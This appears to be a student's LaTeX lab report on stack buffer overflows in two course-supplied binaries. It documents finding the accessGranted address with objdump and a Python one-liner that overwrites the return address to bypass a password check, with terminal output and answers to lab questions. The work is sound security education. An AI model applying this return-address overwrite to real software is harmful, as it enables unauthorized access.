@@ -1,0 +1,142 @@
+\documentclass[12pt]{article}
+\usepackage{listings}
+\usepackage{xcolor}
+\usepackage{hyperref}
+\usepackage{geometry}
+\geometry{margin=1in}
+
+\lstdefinelanguage{Bash}{
+    keywords={cd, ls, tar, python, objdump, grep, Enter},
+    sensitive=false,
+    comment=[l]{\#},
+    morecomment=[s]{/*}{*/},
+    morestring=[b]',
+    morestring=[b]",
+}
+
+\lstdefinestyle{terminal}{
+    language=Bash,
+    backgroundcolor=\color{black},
+    basicstyle=\footnotesize\color{white}\ttfamily,
+    keywordstyle=\color{cyan},
+    commentstyle=\color{green},
+    stringstyle=\color{yellow},
+    showstringspaces=false,
+    breaklines=true,
+    frame=single,
+    framerule=0pt,
+    rulecolor=\color{black},
+}
+
+\begin{document}
+
+\title{Buffer Overflow Lab Report}
+\author{Abraham J. Reines}
+\date{\today}
+\maketitle
+
+\section{Introduction}
+
+This lab focuses on exploiting buffer overflow vulnerabilities in two programs, \texttt{buffer\_oflow1} and \texttt{buffer\_oflow2}. The objective is to overwrite the return address on the stack to execute the \texttt{accessGranted} function without providing the correct password.
+
+\section{Lab Procedures}
+
+\subsection{Setting Up}
+
+The provided archive was extracted, and the contents were listed:
+
+\begin{lstlisting}[style=terminal]
+student@desktop:~$ tar -xvf buffer_oflow.tar
+./buffer_oflow/
+./buffer_oflow/buffer_oflow1
+./buffer_oflow/buffer_oflow2
+
+student@desktop:~$ cd buffer_oflow/
+student@desktop:~/buffer_oflow$ ls -al
+total 24
+drwxr-xr-x 2 student student 4096 Jan 24  2017 .
+drwxr-xr-x 3 student student 4096 Oct 15 22:34 ..
+-rwxr-xr-x 1 student student 5665 Jan 24  2017 buffer_oflow1
+-rwxr-xr-x 1 student student 5873 Jan 24  2017 buffer_oflow2
+\end{lstlisting}
+
+\subsection{Initial Tests}
+
+Running \texttt{buffer\_oflow1} with incorrect and correct passwords:
+
+\begin{lstlisting}[style=terminal]
+student@desktop:~/buffer_oflow$ ./buffer_oflow1 
+Enter password: password
+Access Denied . . . 
+
+student@desktop:~/buffer_oflow$ ./buffer_oflow1 
+Enter password: $3cr3t
+Access Granted!
+"Progress isn't made by early risers. It's made by lazy men trying to find easier ways to do something."
+- Robert Heinlein
+\end{lstlisting}
+
+\section{Exploiting the Buffer Overflow}
+
+\subsection{Finding the Address of \texttt{accessGranted}}
+
+The \texttt{objdump} utility was used to find the address of the \texttt{accessGranted} function:
+
+\begin{lstlisting}[style=terminal]
+student@desktop:~/buffer_oflow$ objdump -d buffer_oflow1 | grep accessGranted
+080484ac <accessGranted>:
+\end{lstlisting}
+
+The address is \texttt{0x080484ac}.
+
+\subsection{Determining the Buffer Size}
+
+A series of inputs with increasing lengths of 'A's were tested to cause a segmentation fault, indicating a buffer overflow.
+
+\subsection{Crafting the Exploit}
+
+An input string was constructed with 82 'A's followed by the address of \texttt{accessGranted} in little-endian format:
+
+\begin{lstlisting}[style=terminal]
+student@desktop:~/buffer_oflow$ python -c 'print "A"*82 + "\xac\x84\x04\x08"' | ./buffer_oflow1
+Enter password: Access Denied . . . 
+Access Granted!
+"Progress isn't made by early risers. It's made by lazy men trying to find easier ways to do something."
+- Robert Heinlein
+Segmentation fault (core dumped)
+\end{lstlisting}
+
+\section{Lab Questions}
+
+\begin{enumerate}
+    \item \textbf{Address of \texttt{accessGranted} in \texttt{buffer\_oflow2}:} Using \texttt{objdump}, the address is \texttt{0x080484c5}.
+    \item \textbf{Number of Bytes to Overflow the Input Buffer:} It takes 82 bytes ('A's) to reach the return address.
+    \item \textbf{Last Name of the Author Quoted:} The author quoted is Heinlein.
+    \item \textbf{Reason for the Segmentation Fault After \texttt{accessGranted}:} The segmentation fault occurs because the return address for \texttt{accessGranted} is invalid. Since the stack was overwritten, there is no valid return address for \texttt{accessGranted}, causing the program to crash when it tries to return.
+\end{enumerate}
+
+\section{Conclusion}
+
+By exploiting a buffer overflow vulnerability, the return address on the stack was overwritten with the address of the \texttt{accessGranted} function. This allowed execution of privileged code without the correct password. The segmentation fault occurred due to the corrupted stack frame lacking a valid return address for \texttt{accessGranted}.
+
+\section{References}
+
+\begin{itemize}
+    \item Aleph One. "Smashing the Stack for Fun and Profit." \textit{Phrack Magazine}, Issue 49, 1996. Available at: \url{http://phrack.org/issues/49/14.html}
+    \item Erickson, Jon. \textit{Hacking: The Art of Exploitation}. 2nd Edition, No Starch Press, 2008.
+    \item Szor, Peter. \textit{The Art of Computer Virus Research and Defense}. Addison-Wesley Professional, 2005.
+    \item Seacord, Robert C. \textit{Secure Coding in C and C++}. 2nd Edition, Addison-Wesley Professional, 2013.
+    \item Bryant, Randal E., and David R. O'Hallaron. \textit{Computer Systems: A Programmer's Perspective}. 3rd Edition, Pearson, 2015.
+    \item Cowan, Crispin, et al. "StackGuard: Automatic Adaptive Detection and Prevention of Buffer-Overflow Attacks." In \textit{Proceedings of the 7th USENIX Security Symposium}, San Antonio, Texas, 1998.
+    \item Lipp, Moritz, et al. "Meltdown: Reading Kernel Memory from User Space." In \textit{Proceedings of the 27th USENIX Security Symposium}, Baltimore, MD, 2018.
+    \item Lin, Zhiqiang, et al. "Automatic Protocol Format Reverse Engineering through Context-Aware Monitored Execution." In \textit{Proceedings of the Network and Distributed System Security Symposium (NDSS)}, San Diego, CA, 2008.
+    \item Larochelle, David, and David Evans. "Statically Detecting Likely Buffer Overflow Vulnerabilities." In \textit{Proceedings of the 10th USENIX Security Symposium}, Washington, D.C., 2001.
+    \item Stallings, William. \textit{Computer Security: Principles and Practice}. 4th Edition, Pearson, 2018.
+    \item Wang, Wallace. \textit{Steal This Computer Book 4.0: What They Won't Tell You About the Internet}. No Starch Press, 2006.
+    \item Howard, M., LeBlanc, D., \& Viega, J. (2005). \textit{24 deadly sins of software security: Programming flaws and how to fix them.} McGraw-Hill.
+\end{itemize}
+
+\vfill
+{\color{red}\textit{“This work complies with JMU honor code. I did not give or receive unauthorized help on this assignment.”}}
+
+\end{document}
